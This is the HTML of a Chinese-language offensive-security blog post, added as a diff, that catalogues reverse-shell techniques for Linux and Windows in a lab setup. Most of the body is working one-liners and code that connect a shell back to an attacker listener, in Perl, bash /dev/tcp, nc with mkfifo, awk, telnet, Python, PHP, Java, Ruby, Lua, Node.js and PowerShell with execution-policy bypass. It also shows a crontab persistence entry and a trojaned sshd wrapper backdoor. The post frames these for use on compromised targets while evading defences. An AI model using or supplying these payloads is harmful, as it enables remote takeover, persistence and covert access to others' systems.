@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="reverse shell," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Evil-404" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
+<meta name="keywords" content="reverse shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="你和目标只差一个shell的距离">
+<meta property="og:url" content="https://evil-404.github.io/revese-shell.html">
+<meta property="og:site_name" content="Evil-404">
+<meta property="og:description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_perl.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_dev_tcp.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_sshd_shell1.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_sshd_shell2.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_sshd_shell3.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_sshd_wrapper.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_bash_mkfifo.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_awk.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_telnet_two.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_telnet_mknod.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_py.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_sshd_croantab.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_sshd_php.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_ruby_shell.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_lua_shell.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_c_shell.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_icmp_shell.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_udp_shell.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_mini_shell.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_minrev_shell.png">
+<meta property="og:image" content="https://evil-404.github.io/img/linux_poewrcat_shell.png">
+<meta property="og:updated_time" content="2017-12-19T06:10:04.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="你和目标只差一个shell的距离">
+<meta name="twitter:description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
+<meta name="twitter:image" content="https://evil-404.github.io/img/linux_perl.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'LPBE9XRFRL',
+      apiKey: '246a90c6ff16be5d5708e201cf6d7158',
+      indexName: 'Index',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键字搜索","hits_empty":"“没有找到与 ${query} 相关的内容”","hits_stats":"“搜索到 ${hits} 条相关记录，共耗时 ${time} ms”"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://evil-404.github.io/revese-shell.html"/>
+
+
+
+
+
+  <title>你和目标只差一个shell的距离 | Evil-404</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Evil-404</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">专注于 APT 攻防研究,致力于高质量实用干货分享</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://evil-404.github.io/revese-shell.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VK">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://ws1.sinaimg.cn/large/baeae4e0ly1fsu7yzju7lj20af0a0wej.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Evil-404">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">你和目标只差一个shell的距离</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-09-28T10:13:41+08:00">
+                2016-09-28
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-12-19T14:10:04+08:00">
+                2017-12-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/shell/" itemprop="url" rel="index">
+                    <span itemprop="name">shell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,761
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><br><br>0x01 前奏说明<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……</p>
+<p>0x02 大致环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win7          192.168.1.128</span><br><span class="line">centos6.8     192.168.1.129</span><br><span class="line">win2008R2     192.168.1.131</span><br><span class="line">kali          192.168.1.147</span><br></pre></td></tr></table></figure></p>
+<p>0x03 关于linux平台下弹shell的一些方式</p>
+<p>利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 53</span><br><span class="line"># perl -e &apos;use Socket;$i=&quot;192.168.1.128&quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_perl.png" alt="&#39;&#39;"><br><br><a id="more"></a><br>利用系统特殊设备文件/dev/tcp[当然,有这种特性的文件并不止这一个],语句的意思其实很简单,通俗点儿讲就是把bash的数据全部通多/dev/tcp建立的socket发过去,以此来达到反弹shell的效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 80</span><br><span class="line"># /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.128/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_dev_tcp.png" alt="&#39;&#39;"><br></p>
+<p>利用sshd来反弹shell,ln -f的意思就是把原有的数据清空,整体语句的意思通俗点儿讲,就是把sshd绑定在本地的8080端口上,这样当别人从8080这个端口进来的时候就相当于直接进到本机的sshd中,-o就是去掉第一次ssh连接的那个密钥对提示,像这种正向连,有个非常不好的地方,防火墙只要阻断你这个端口的数据通信就基本废掉了</p>
+<p>第一种方式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line"># ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;</span><br><span class="line"># netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line"># ssh root@192.168.1.129 -p 8080      一定要注意在自己本地机器上用这个端口去连</span><br><span class="line"># pkill su</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_shell1.png" alt="&#39;&#39;"><br><img src="/img/linux_sshd_shell2.png" alt="&#39;&#39;"><br><img src="/img/linux_sshd_shell3.png" alt="&#39;&#39;"><br></p>
+<p>第二种方式,注意这里的socat连接的端口,默认是13377端口,关于socat,这里就不多做介绍了,一个高级端口转发工具,当然,并不只是转发那么简单,想必小伙伴们应该也用的比较多了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># cd /usr/sbin/</span><br><span class="line"># mv sshd ../bin/</span><br><span class="line"># echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line"># echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line"># echo &apos;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line"># chmod u+x sshd</span><br><span class="line"># /etc/init.d/sshd restart</span><br><span class="line"># socat STDIO TCP4:192.168.1.129:22,sourceport=13377</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_wrapper.png" alt="&#39;&#39;"><br></p>
+<p>利用最古老的nc来反弹,但默认正常发行版中默认带的那个nc都是阉割版的,即没有-e选项,也就意味着不能直接用它反弹shell,好在强大的linux为我们提供了一个建立管道的工具mkfifo和bash本身的各种管道特性,我们就可以利这种方式,把bash的数据通过管道反弹走</p>
+<p>普通nc反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.128 8080 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_bash_mkfifo.png" alt="&#39;&#39;"><br></p>
+<p>加密版的netcat = ‘cryptcat’,可以设置连接密码,用-k指定下即可,kali默认自带,如果是目标机器,可能需要你自己手工动装一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cryptcat -vv -l -p 25 -k sec</span><br><span class="line"># cryptcat -vv -l -p 80 -k sec</span><br><span class="line"># cryptcat 192.168.12.141 80 -k sec|cmd.exe|cryptcat 192.168.12.141 25 -k sec</span><br></pre></td></tr></table></figure></p>
+<p>利用awk或gawk来反弹shell,awk就不用多说了吧,linux文本处理三剑客的老大,语句的意思也非常简单,就是循环发socket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_awk.png" alt="&#39;&#39;"><br></p>
+<p>利用系统自带的telnet客户端来反弹shell,一般运维默认都会把它装上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">C:\&gt;nc -vlp 1080   命令结果显示窗口</span><br><span class="line">C:\&gt;nc -lvp 8080   命令传输窗口</span><br><span class="line"># telnet 192.168.1.128 8080 | /bin/bash | telnet 192.168.1.128 1080</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_telnet_two.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第二种</span><br><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># mknod test p &amp;&amp; telnet 192.168.1.128  8080 0&lt;test | /bin/bash 1&gt;test</span><br></pre></td></tr></table></figure>
+<p><img src="/img/linux_telnet_mknod.png" alt="&#39;&#39;"><br></p>
+<p>利用py反弹shell,就像perl在绝大多数发行版上都已经自带,但默认是2.6.6,不过,对我们来说,足矣,当然啦,这里只是用最简单的py的socket来反弹一个shell,关于其它的更高级的py reverse_shell 这里就不说了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.128&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_py.png" alt="&#39;&#39;"><br></p>
+<p>利用crontab定时反弹shell,很容被发现,临时用用还行,至于用什么反弹,随意,perl,py都行,你喜欢,用完以后记得立马删掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># (crontab -l;printf &quot;* * * * *  /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.1.128\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot;)|crontab -</span><br><span class="line"># crontab -e</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_croantab.png" alt="&#39;&#39;"><br></p>
+<p>利用php的socket来反弹,对于php的网站,也许我们可以利用上,也是很多php大马里默认的反弹方式,当然,除了php脚本,别的web后端脚本其实都可以被利用,比如,jsp…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># /usr/local/php/bin/php -r &apos;$sock=fsockopen(&quot;192.168.1.128&quot;,8080);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_sshd_php.png" alt="&#39;&#39;"><br></p>
+<p>如果目标机器上有java环境,那就更好了,直接用java来弹,效果一般还是非常好的,而且java的免杀效果也很不错哦,把下面的代码打成jar包就可以了,记得打之前改下里面要反弹到的ip和端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"></span><br><span class="line">public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.1.128/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>利用ruby的socket来反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;192.168.1.128&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_ruby_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用lua的socket来反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c:\nc -lvp 8080</span><br><span class="line"># apt-get install lua50 -y</span><br><span class="line"># apt-get install luarocks -y</span><br><span class="line"># luarocks install luasocket</span><br><span class="line"># lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.1.128&apos;,&apos;8080&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_lua_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用nodejs反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">    cp = require(&quot;child_process&quot;),</span><br><span class="line">    sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;10.17.26.64&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
+<p>c版的reverse_shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br><span class="line"># gcc c_revese_shell.c -o cshell</span><br><span class="line"># ./cshell 192.168.1.128 8080</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_c_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用gcc反弹shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">抱歉,自己在本地暂时还没成功,待续....</span><br></pre></td></tr></table></figure></p>
+<p>0x04 基于不同协议下的shell反弹方式</p>
+<p>利用icmp来反弹shell,需要你自己先编译下,会生成两个文件,一个服务端[ishd]一个客户端[ish],自己有兴趣可以拿wireshark看下,通常用来穿透高层防火墙<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># make linux</span><br><span class="line"># ./ishd -i 6555 -t 0 -p 8080</span><br><span class="line"># ./ish -i 6555 -t 0 -p 8080 192.168.1.129[这里的ip可以换成域名]</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_icmp_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用udp来反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -l -p 53 -u     注意这里务必要用udp的模式来接</span><br><span class="line"># python udpshell.py 192.168.1.128 53 udp</span><br></pre></td></tr></table></figure></p>
+<p><img src="/img/linux_udp_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用dns来反弹shell的方式,就不说了吧,详情可自行参考cobalt strike,那可能是现今最好的dns隧道学习样例</p>
+<p>0x05 关于win平台下的一些shell反弹方式</p>
+<p>除了上面这些可以通用的语言反弹shell之外,可能最重要的就是powershell了,当然啦,如果你说vbs更好,那我也没啥好说的了,毕竟自己平时遇到03以下的系统实在是太少了,可能以后也会越来越少,人总要向前看嘛<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 8080</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">记得到脚本里面去把要反弹到的ip和端口改一下,另外,可能是因为cmd默认的字符集[gbk]所以才会乱码,如果是英文系统就不会了</span><br><span class="line"># powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\mini-reverse.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/linux_mini_shell.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">同样要记得去把脚本里要反弹到的ip和端口改成你自己的,这个格式化输出写的确实不怎么好</span><br><span class="line"># powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\minRev.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/linux_minrev_shell.png" alt="&#39;&#39;"><br></p>
+<p>利用powercat来反弹shell,其实就是powershell版的netcat</p>
